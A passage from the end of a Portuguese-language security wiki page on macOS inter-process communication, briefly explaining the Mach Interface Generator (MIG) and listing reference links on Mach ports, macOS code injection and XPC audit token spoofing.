../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/
{{#endref}}

## MIG - Gerador de Interface Mach

O MIG foi criado para **simplificar o processo de criação de código Mach IPC**. Ele basicamente **gera o código necessário** para que o servidor e o cliente se comuniquem com uma definição dada. Mesmo que o código gerado seja feio, um desenvolvedor só precisará importá-lo e seu código será muito mais simples do que antes.

Para mais informações, consulte:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md
{{#endref}}

## Referências

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

{{#include ../../../../banners/hacktricks-training.md}}
